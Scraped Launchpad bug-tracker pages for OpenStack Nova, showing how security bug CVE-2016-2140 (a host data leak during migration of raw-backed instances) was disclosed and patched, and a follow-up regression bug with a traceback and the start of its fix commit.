![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2016-03-08: |  |  | [#57](/nova/%2Bbug/1548450/comments/57) |
| --- | --- | --- | --- |

Since the former patch are still correct, let's proceed with the original plan and open this bug in 10 minutes.

Since the former patch are still correct, let's proceed with the original plan and open this bug in 10 minutes.

[Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray)
on 2016-03-08

| **information type**: | Private Security → Public |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2016-03-08:  [**Fix proposed to nova (master)**](/nova/%2Bbug/1548450/comments/58) |  |  | [#58](/nova/%2Bbug/1548450/comments/58) |
| --- | --- | --- | --- |

Fix proposed to branch: master

Review: <https://review.openstack.org/289957>

Fix proposed to branch: master
Review: https://review.openstack.org/289957

| Changed in nova: | |
| --- | --- |
| **assignee**: | nobody → Lee Yarwood (lyarwood) |
| **status**: | Confirmed → In Progress |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2016-03-08:  [**Fix proposed to nova (stable/liberty)**](/nova/%2Bbug/1548450/comments/59) |  |  | [#59](/nova/%2Bbug/1548450/comments/59) |
| --- | --- | --- | --- |

Fix proposed to branch: stable/liberty

Review: <https://review.openstack.org/289958>

Fix proposed to branch: stable/liberty
Review: https://review.openstack.org/289958

[Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray)
on 2016-03-08

| **summary**: | - Host data leak during resize/migrate for raw-backed instances- (CVE-2016-2140)+ [OSSA 2016-007] Host data leak during resize/migrate for raw-backed+ instances (CVE-2016-2140) |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2016-03-08:  [**Fix proposed to nova (stable/kilo)**](/nova/%2Bbug/1548450/comments/60) |  |  | [#60](/nova/%2Bbug/1548450/comments/60) |
| --- | --- | --- | --- |

Fix proposed to branch: stable/kilo

Review: <https://review.openstack.org/289960>

Fix proposed to branch: stable/kilo
Review: https://review.openstack.org/289960

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2016-03-08:  [**Related fix proposed to ossa (master)**](/nova/%2Bbug/1548450/comments/61) |  |  | [#61](/nova/%2Bbug/1548450/comments/61) |
| --- | --- | --- | --- |

Related fix proposed to branch: master

Review: <https://review.openstack.org/289961>

Related fix proposed to branch: master
Review: https://review.openstack.org/289961

[Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray)
on 2016-03-08

| **description**: | updated |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2016-03-08:  [**Related fix merged to ossa (master)**](/nova/%2Bbug/1548450/comments/62) |  |  | [#62](/nova/%2Bbug/1548450/comments/62) |
| --- | --- | --- | --- |

Reviewed: <https://review.openstack.org/289961>

Committed: <https://git.openstack.org/cgit/openstack/ossa/commit/?id=51a4f35c3eaa700e80d6611db7e4b2c85bc82f8b>

Submitter: Jenkins

Branch: master

commit 51a4f35c3eaa700e80d6611db7e4b2c85bc82f8b

Author: Tristan Cacqueray <email address hidden>

Date: Tue Mar 8 10:05:25 2016 -0500

Adds OSSA 2016-007 (CVE-2016-2140)

Change-Id: I95d3a2211e25e7e121b4a67a729e4c4364eb1118

    Related-Bug: #1548450

Reviewed: https://review.openstack.org/289961
Committed: https://git.openstack.org/cgit/openstack/ossa/commit/?id=51a4f35c3eaa700e80d6611db7e4b2c85bc82f8b
Submitter: Jenkins
Branch: master
commit 51a4f35c3eaa700e80d6611db7e4b2c85bc82f8b
Author: Tristan Cacqueray <tdecacqu@redhat.com>
Date: Tue Mar 8 10:05:25 2016 -0500
Adds OSSA 2016-007 (CVE-2016-2140)
Change-Id: I95d3a2211e25e7e121b4a67a729e4c4364eb1118
Related-Bug: #1548450

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2016-03-09:  [**Fix merged to nova (master)**](/nova/%2Bbug/1548450/comments/63) |  |  | [#63](/nova/%2Bbug/1548450/comments/63) |
| --- | --- | --- | --- |

Reviewed: <https://review.openstack.org/289957>

Committed: <https://git.openstack.org/cgit/openstack/nova/commit/?id=116b1210ab772c55d1ed1f715687d83877c92701>

Submitter: Jenkins

Branch: master

commit 116b1210ab772c55d1ed1f715687d83877c92701

Author: Lee Yarwood <email address hidden>

Date: Wed Feb 24 11:23:22 2016 +0000

libvirt: Always copy or recreate disk.info during a migration

The disk.info file contains the path and format of any image, config or

    ephermal disk associated with an instance. When using RAW images and migrating

    an instance this file should always be copied or recreated. This avoids the Raw

    imagebackend reinspecting the format of these disks when spawning the instance

    on the destination host.

By not copying or recreating this disk.info file, a malicious image written to

    an instance disk on the source host will cause Nova to reinspect and record a

    different format for the disk on the destination. This format then being used

    incorrectly when finally spawning the instance on the destination.

SecurityImpact

    Closes-bug: #1548450

    Change-Id: Idfc16f54049aaeab31ac1c1d8d79a129acc9fb87

Reviewed: https://review.openstack.org/289957
Committed: https://git.openstack.org/cgit/openstack/nova/commit/?id=116b1210ab772c55d1ed1f715687d83877c92701
Submitter: Jenkins
Branch: master
commit 116b1210ab772c55d1ed1f715687d83877c92701
Author: Lee Yarwood <lyarwood@redhat.com>
Date: Wed Feb 24 11:23:22 2016 +0000
libvirt: Always copy or recreate disk.info during a migration
The disk.info file contains the path and format of any image, config or
ephermal disk associated with an instance. When using RAW images and migrating
an instance this file should always be copied or recreated. This avoids the Raw
imagebackend reinspecting the format of these disks when spawning the instance
on the destination host.
By not copying or recreating this disk.info file, a malicious image written to
an instance disk on the source host will cause Nova to reinspect and record a
different format for the disk on the destination. This format then being used
incorrectly when finally spawning the instance on the destination.
SecurityImpact
Closes-bug: #1548450
Change-Id: Idfc16f54049aaeab31ac1c1d8d79a129acc9fb87

| Changed in nova: | |
| --- | --- |
| **status**: | In Progress → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2016-03-10:  [**Fix merged to nova (stable/liberty)**](/nova/%2Bbug/1548450/comments/64) |  |  | [#64](/nova/%2Bbug/1548450/comments/64) |
| --- | --- | --- | --- |

Reviewed: <https://review.openstack.org/289958>

Committed: <https://git.openstack.org/cgit/openstack/nova/commit/?id=8d5ba34751c0ae8093f987d74348dffd8ca0b61c>

Submitter: Jenkins

Branch: stable/liberty

commit 8d5ba34751c0ae8093f987d74348dffd8ca0b61c

Author: Lee Yarwood <email address hidden>

Date: Wed Feb 24 11:23:22 2016 +0000

libvirt: Always copy or recreate disk.info during a migration

The disk.info file contains the path and format of any image, config or

    ephermal disk associated with an instance. When using RAW images and migrating

    an instance this file should always be copied or recreated. This avoids the Raw

    imagebackend reinspecting the format of these disks when spawning the instance

    on the destination host.

By not copying or recreating this disk.info file, a malicious image written to

    an instance disk on the source host will cause Nova to reinspect and record a

    different format for the disk on the destination. This format then being used

    incorrectly when finally spawning the instance on the destination.

SecurityImpact

    Closes-bug: #1548450

    Change-Id: Idfc16f54049aaeab31ac1c1d8d79a129acc9fb87

Reviewed: https://review.openstack.org/289958
Committed: https://git.openstack.org/cgit/openstack/nova/commit/?id=8d5ba34751c0ae8093f987d74348dffd8ca0b61c
Submitter: Jenkins
Branch: stable/liberty
commit 8d5ba34751c0ae8093f987d74348dffd8ca0b61c
Author: Lee Yarwood <lyarwood@redhat.com>
Date: Wed Feb 24 11:23:22 2016 +0000
libvirt: Always copy or recreate disk.info during a migration
The disk.info file contains the path and format of any image, config or
ephermal disk associated with an instance. When using RAW images and migrating
an instance this file should always be copied or recreated. This avoids the Raw
imagebackend reinspecting the format of these disks when spawning the instance
on the destination host.
By not copying or recreating this disk.info file, a malicious image written to
an instance disk on the source host will cause Nova to reinspect and record a
different format for the disk on the destination. This format then being used
incorrectly when finally spawning the instance on the destination.
SecurityImpact
Closes-bug: #1548450
Change-Id: Idfc16f54049aaeab31ac1c1d8d79a129acc9fb87

| **tags**: | added: in-stable-liberty |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2016-03-10:  [**Fix merged to nova (stable/kilo)**](/nova/%2Bbug/1548450/comments/65) |  |  | [#65](/nova/%2Bbug/1548450/comments/65) |
| --- | --- | --- | --- |

Reviewed: <https://review.openstack.org/289960>

Committed: <https://git.openstack.org/cgit/openstack/nova/commit/?id=f302bf04ab5dda89cf8ceaeed309006da90c0666>

Submitter: Jenkins

Branch: stable/kilo

commit f302bf04ab5dda89cf8ceaeed309006da90c0666

Author: Lee Yarwood <email address hidden>

Date: Wed Feb 24 11:23:22 2016 +0000

libvirt: Always copy or recreate disk.info during a migration

The disk.info file contains the path and format of any image, config or

    ephermal disk associated with an instance. When using RAW images and migrating

    an instance this file should always be copied or recreated. This avoids the Raw

    imagebackend reinspecting the format of these disks when spawning the instance

    on the destination host.

By not copying or recreating this disk.info file, a malicious image written to

    an instance disk on the source host will cause Nova to reinspect and record a

    different format for the disk on the destination. This format then being used

    incorrectly when finally spawning the instance on the destination.

Conflicts:

        nova/tests/unit/virt/libvirt/test\_driver.py

        nova/virt/libvirt/driver.py

SecurityImpact

    Closes-bug: #1548450

    Change-Id: Idfc16f54049aaeab31ac1c1d8d79a129acc9fb87

Reviewed: https://review.openstack.org/289960
Committed: https://git.openstack.org/cgit/openstack/nova/commit/?id=f302bf04ab5dda89cf8ceaeed309006da90c0666
Submitter: Jenkins
Branch: stable/kilo
commit f302bf04ab5dda89cf8ceaeed309006da90c0666
Author: Lee Yarwood <lyarwood@redhat.com>
Date: Wed Feb 24 11:23:22 2016 +0000
libvirt: Always copy or recreate disk.info during a migration
The disk.info file contains the path and format of any image, config or
ephermal disk associated with an instance. When using RAW images and migrating
an instance this file should always be copied or recreated. This avoids the Raw
imagebackend reinspecting the format of these disks when spawning the instance
on the destination host.
By not copying or recreating this disk.info file, a malicious image written to
an instance disk on the source host will cause Nova to reinspect and record a
different format for the disk on the destination. This format then being used
incorrectly when finally spawning the instance on the destination.
Conflicts:
nova/tests/unit/virt/libvirt/test\_driver.py
nova/virt/libvirt/driver.py
SecurityImpact
Closes-bug: #1548450
Change-Id: Idfc16f54049aaeab31ac1c1d8d79a129acc9fb87

| **tags**: | added: in-stable-kilo |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2016-03-10:  [**Related fix proposed to nova (master)**](/nova/%2Bbug/1548450/comments/66) |  |  | [#66](/nova/%2Bbug/1548450/comments/66) |
| --- | --- | --- | --- |

Related fix proposed to branch: master

Review: <https://review.openstack.org/291208>

Related fix proposed to branch: master
Review: https://review.openstack.org/291208

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2016-03-10:  [**Related fix proposed to nova (stable/liberty)**](/nova/%2Bbug/1548450/comments/67) |  |  | [#67](/nova/%2Bbug/1548450/comments/67) |
| --- | --- | --- | --- |

Related fix proposed to branch: stable/liberty

Review: <https://review.openstack.org/291221>

Related fix proposed to branch: stable/liberty
Review: https://review.openstack.org/291221

[Matt Riedemann (mriedem)](https://launchpad.net/~mriedem)
on 2016-03-10

| Changed in nova: | |
| --- | --- |
| **importance**: | Undecided → Critical |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2016-03-10:  [**Related fix merged to nova (stable/liberty)**](/nova/%2Bbug/1548450/comments/68) |  |  | [#68](/nova/%2Bbug/1548450/comments/68) |
| --- | --- | --- | --- |

Reviewed: <https://review.openstack.org/291221>

Committed: <https://git.openstack.org/cgit/openstack/nova/commit/?id=0b194187db9da28225cb5e62be3b45aff5a1c793>

Submitter: Jenkins

Branch: stable/liberty

commit 0b194187db9da28225cb5e62be3b45aff5a1c793

Author: Matt Riedemann <email address hidden>

Date: Thu Mar 10 10:07:11 2016 -0500

Add release note for CVE [bug 1548450](/bugs/1548450)

This will go into the 12.0.3 release.

Change-Id: I3792dcdd9f87556b9de435818cec1700630a7b26

    Related-Bug: #1548450

Reviewed: https://review.openstack.org/291221
Committed: https://git.openstack.org/cgit/openstack/nova/commit/?id=0b194187db9da28225cb5e62be3b45aff5a1c793
Submitter: Jenkins
Branch: stable/liberty
commit 0b194187db9da28225cb5e62be3b45aff5a1c793
Author: Matt Riedemann <mriedem@us.ibm.com>
Date: Thu Mar 10 10:07:11 2016 -0500
Add release note for CVE bug 1548450
This will go into the 12.0.3 release.
Change-Id: I3792dcdd9f87556b9de435818cec1700630a7b26
Related-Bug: #1548450

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2016-03-10:  [**Related fix merged to nova (master)**](/nova/%2Bbug/1548450/comments/69) |  |  | [#69](/nova/%2Bbug/1548450/comments/69) |
| --- | --- | --- | --- |

Reviewed: <https://review.openstack.org/291208>

Committed: <https://git.openstack.org/cgit/openstack/nova/commit/?id=9c0bbda07fdcf134308371644d09becbb18c62b1>

Submitter: Jenkins

Branch: master

commit 9c0bbda07fdcf134308371644d09becbb18c62b1

Author: Matt Riedemann <email address hidden>

Date: Thu Mar 10 09:35:00 2016 -0500

Add release notes for security fixes in 13.0.0 mitaka GA

There are three security issues fixed in mitaka.

The first two were documented for liberty 12.0.1 but we

    apparently forgot to doc them for mitaka.

Related-Bug: #1524274

    Related-Bug: #1516765

    Related-Bug: #1548450

Change-Id: I3eba75f1fc86c4c9abd258042dfafc6df1f2405c

Reviewed: https://review.openstack.org/291208
Committed: https://git.openstack.org/cgit/openstack/nova/commit/?id=9c0bbda07fdcf134308371644d09becbb18c62b1
Submitter: Jenkins
Branch: master
commit 9c0bbda07fdcf134308371644d09becbb18c62b1
Author: Matt Riedemann <mriedem@us.ibm.com>
Date: Thu Mar 10 09:35:00 2016 -0500
Add release notes for security fixes in 13.0.0 mitaka GA
There are three security issues fixed in mitaka.
The first two were documented for liberty 12.0.1 but we
apparently forgot to doc them for mitaka.
Related-Bug: #1524274
Related-Bug: #1516765
Related-Bug: #1548450
Change-Id: I3eba75f1fc86c4c9abd258042dfafc6df1f2405c

[Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray)
on 2016-03-14

| Changed in ossa: | |
| --- | --- |
| **status**: | Fix Committed → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Doug Hellmann (doug-hellmann)](https://launchpad.net/~doug-hellmann) wrote on 2016-05-10:  [**Fix included in openstack/nova 2015.1.4**](/nova/%2Bbug/1548450/comments/70) |  |  | [#70](/nova/%2Bbug/1548450/comments/70) |
| --- | --- | --- | --- |

This issue was fixed in the openstack/nova 2015.1.4 release.

This issue was fixed in the openstack/nova 2015.1.4 release.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2016-11-10: |  |  | [#71](/nova/%2Bbug/1548450/comments/71) |
| --- | --- | --- | --- |

This issue was fixed in the openstack/nova 2015.1.4 release.

This issue was fixed in the openstack/nova 2015.1.4 release.

[See full activity log](https://bugs.launchpad.net/nova/%2Bbug/1548450/%2Bactivity)

To post a comment you must [log in](%2Blogin?comments=all).

* [Report a bug](/nova/%2Bfilebug)

This report contains
**Public**
information

Everyone can see this information.

You are
[not directly subscribed to this bug's notifications.](/nova/%2Bbug/1548450/%2Bsubscribe)

Subscribing...

* [Edit bug mail](https://bugs.launchpad.net/nova/%2Bbug/1548450/%2Bsubscriptions "View and change your subscriptions to this bug")

## Other bug subscribers

[Subscribe someone else](https://bugs.launchpad.net/nova/%2Bbug/1548450/%2Baddsubscriber "Launchpad will email that person whenever this bugs changes")

## Patches

* [0001-libvirt-Always-copy-or-recreate-disk.info-during-a-m-master.patch](https://bugs.launchpad.net/nova/%2Bbug/1548450/%2Battachment/4588377/%2Bfiles/0001-libvirt-Always-copy-or-recreate-disk.info-during-a-m-master.patch)
  [Edit](/nova/%2Bbug/1548450/%2Battachment/4588377 "Change patch details")
* [0001-libvirt-Always-copy-or-recreate-disk.info-during-a-m-liberty.patch](https://bugs.launchpad.net/nova/%2Bbug/1548450/%2Battachment/4588378/%2Bfiles/0001-libvirt-Always-copy-or-recreate-disk.info-during-a-m-liberty.patch)
  [Edit](/nova/%2Bbug/1548450/%2Battachment/4588378 "Change patch details")
* [0001-libvirt-Always-copy-or-recreate-disk.info-during-a-m-kilo.patch](https://bugs.launchpad.net/nova/%2Bbug/1548450/%2Battachment/4588379/%2Bfiles/0001-libvirt-Always-copy-or-recreate-disk.info-during-a-m-kilo.patch)
  [Edit](/nova/%2Bbug/1548450/%2Battachment/4588379 "Change patch details")

* [Add patch](/nova/%2Bbug/1548450/%2Baddcomment?field.patch=on)

## Remote bug watches

Bug watches keep track of this bug in other bug trackers.

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from review.openstack.org_553ff7da_20250126_124859.html ===




=== Content from bugs.launchpad.net_26f287b0_20250126_124851.html ===

[Log in / Register](https://bugs.launchpad.net/nova/%2Bbug/1555287/%2Blogin)

[![](https://launchpadlibrarian.net/324577028/nova64.png)](https://launchpad.net/nova)

## [OpenStack Compute (nova)](https://launchpad.net/nova)

* [Overview](https://launchpad.net/nova)
* [Code](https://code.launchpad.net/nova)
* [Bugs](https://bugs.launchpad.net/nova)
* [Blueprints](https://blueprints.launchpad.net/nova)
* [Translations](https://translations.launchpad.net/nova)
* [Answers](https://answers.launchpad.net/nova)

# Libvirt driver broken for non-disk-image backends

Bug #1555287 reported by
[Dan Smith](https://launchpad.net/~danms)
on 2016-03-09

[6](/%2Bhelp-bugs/bug-heat.html)

This bug affects 1 person

| Affects | | Status | Importance | Assigned to | Milestone |
| --- | --- | --- | --- | --- | --- |
|  | [OpenStack Compute (nova)](https://bugs.launchpad.net/nova) | Fix Released | High | [Matthew Booth](https://launchpad.net/~mbooth-9) | [OpenStack Compute (nova) mitaka-rc1 "RC1"](https://launchpad.net/nova/%2Bmilestone/mitaka-rc1) |
|  | [Kilo](https://bugs.launchpad.net/nova/kilo) | Fix Released | High | [Tristan Cacqueray](https://launchpad.net/~tristan-cacqueray) | [OpenStack Compute (nova) 2015.1.4](https://launchpad.net/nova/%2Bmilestone/2015.1.4) |
|  | [Liberty](https://bugs.launchpad.net/nova/liberty) | Fix Released | High | [Tristan Cacqueray](https://launchpad.net/~tristan-cacqueray) |  |

### Bug Description

Recently the ceph job (and any other configuration that doesn't use disk image as the backend storage) started failing like this:

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher Traceback (most recent call last):

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher File "/usr/local/lib/python2.7/dist-packages/oslo\_messaging/rpc/dispatcher.py", line 138, in \_dispatch\_and\_reply

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher incoming.message))

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher File "/usr/local/lib/python2.7/dist-packages/oslo\_messaging/rpc/dispatcher.py", line 183, in \_dispatch

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher return self.\_do\_dispatch(endpoint, method, ctxt, args)

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher File "/usr/local/lib/python2.7/dist-packages/oslo\_messaging/rpc/dispatcher.py", line 127, in \_do\_dispatch

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher result = func(ctxt, \*\*new\_args)

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher File "/opt/stack/new/nova/nova/exception.py", line 110, in wrapped

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher payload)

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher File "/usr/local/lib/python2.7/dist-packages/oslo\_utils/excutils.py", line 220, in \_\_exit\_\_

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher self.force\_reraise()

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher File "/usr/local/lib/python2.7/dist-packages/oslo\_utils/excutils.py", line 196, in force\_reraise

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher six.reraise(self.type\_, self.value, self.tb)

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher File "/opt/stack/new/nova/nova/exception.py", line 89, in wrapped

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher return f(self, context, \*args, \*\*kw)

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher File "/opt/stack/new/nova/nova/compute/manager.py", line 359, in decorated\_function

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher LOG.warning(msg, e, instance=instance)

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher File "/usr/local/lib/python2.7/dist-packages/oslo\_utils/excutils.py", line 220, in \_\_exit\_\_

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher self.force\_reraise()

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher File "/usr/local/lib/python2.7/dist-packages/oslo\_utils/excutils.py", line 196, in force\_reraise

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher six.reraise(self.type\_, self.value, self.tb)

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher File "/opt/stack/new/nova/nova/compute/manager.py", line 328, in decorated\_function

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher return function(self, context, \*args, \*\*kwargs)

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher File "/opt/stack/new/nova/nova/compute/manager.py", line 409, in decorated\_function

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher return function(self, context, \*args, \*\*kwargs)

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher File "/opt/stack/new/nova/nova/compute/manager.py", line 316, in decorated\_function

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher migration.instance\_uuid, exc\_info=True)

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher File "/usr/local/lib/python2.7/dist-packages/oslo\_utils/excutils.py", line 220, in \_\_exit\_\_

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher self.force\_reraise()

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher File "/usr/local/lib/python2.7/dist-packages/oslo\_utils/excutils.py", line 196, in force\_reraise

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher six.reraise(self.type\_, self.value, self.tb)

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher File "/opt/stack/new/nova/nova/compute/manager.py", line 293, in decorated\_function

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher return function(self, context, \*args, \*\*kwargs)

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher File "/opt/stack/new/nova/nova/compute/manager.py", line 387, in decorated\_function

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher kwargs['instance'], e, sys.exc\_info())

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher File "/usr/local/lib/python2.7/dist-packages/oslo\_utils/excutils.py", line 220, in \_\_exit\_\_

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher self.force\_reraise()

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher File "/usr/local/lib/python2.7/dist-packages/oslo\_utils/excutils.py", line 196, in force\_reraise

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher six.reraise(self.type\_, self.value, self.tb)

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher File "/opt/stack/new/nova/nova/compute/manager.py", line 375, in decorated\_function

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher return function(self, context, \*args, \*\*kwargs)

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher File "/opt/stack/new/nova/nova/compute/manager.py", line 3876, in resize\_instance

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher timeout, retry\_interval)

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher File "/opt/stack/new/nova/nova/virt/libvirt/driver.py", line 7237, in migrate\_disk\_and\_power\_off

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher shared\_storage)

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher File "/usr/local/lib/python2.7/dist-packages/oslo\_utils/excutils.py", line 220, in \_\_exit\_\_

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher self.force\_reraise()

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher File "/usr/local/lib/python2.7/dist-packages/oslo\_utils/excutils.py", line 196, in force\_reraise

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher six.reraise(self.type\_, self.value, self.tb)

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher File "/opt/stack/new/nova/nova/virt/libvirt/driver.py", line 7230, in migrate\_disk\_and\_power\_off

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher host=dest, on\_execute=on\_execute,

2016-03-09 14:47:29.102 17597 ERROR oslo\_messaging.rpc.dispatcher UnboundLocalError: local variable 'on\_execute' referenced before assignment

Tags:

[ceph](/nova/%2Bbugs?field.tag=ceph)
[in-stable-liberty](/nova/%2Bbugs?field.tag=in-stable-liberty)
[in-stable-kilo](/nova/%2Bbugs?field.tag=in-stable-kilo)

[OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack)
on 2016-03-09

| Changed in nova: | |
| --- | --- |
| **assignee**: | nobody → Dan Smith (danms) |
| **status**: | Confirmed → In Progress |

[Matt Riedemann (mriedem)](https://launchpad.net/~mriedem)
on 2016-03-09

| **tags**: | added: ceph mitaka-rc-potential |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2016-03-09:  [**Fix proposed to nova (stable/liberty)**](/nova/%2Bbug/1555287/comments/1) |  |  | [#1](/nova/%2Bbug/1555287/comments/1) |
| --- | --- | --- | --- |

Fix proposed to branch: stable/liberty

Review: <https://review.openstack.org/290843>

Fix proposed to branch: stable/liberty
Review: https://review.openstack.org/290843

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2016-03-09:  [**Fix proposed to nova (stable/kilo)**](/nova/%2Bbug/1555287/comments/2) |  |  | [#2](/nova/%2Bbug/1555287/comments/2) |
| --- | --- | --- | --- |

Fix proposed to branch: stable/kilo

Review: <https://review.openstack.org/290847>

Fix proposed to branch: stable/kilo
Review: https://review.openstack.org/290847

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2016-03-09:  [**Fix merged to nova (master)**](/nova/%2Bbug/1555287/comments/3) |  |  | [#3](/nova/%2Bbug/1555287/comments/3) |
| --- | --- | --- | --- |

Reviewed: <https://review.openstack.org/290715>

Committed: <https://git.openstack.org/cgit/openstack/nova/commit/?id=ccd6195e67c735aa216bea51d9dccfed631dc814>

Submitter: Jenkins

Branch: master

commit ccd6195e67c735aa216bea51d9dccfed631dc814

Author: Matthew Booth <email address hidden>

Date: Wed Mar 9 17:27:03 2016 +0000

Fix processing of libvirt disk.info in non-disk-image cases

In Idfc16f54049aaeab31ac1c1d8d79a129acc9fb87 a change was made

    that caused non-disk-image backends to fall over because of an

    undefined variable because they skipped processing of the disk.info

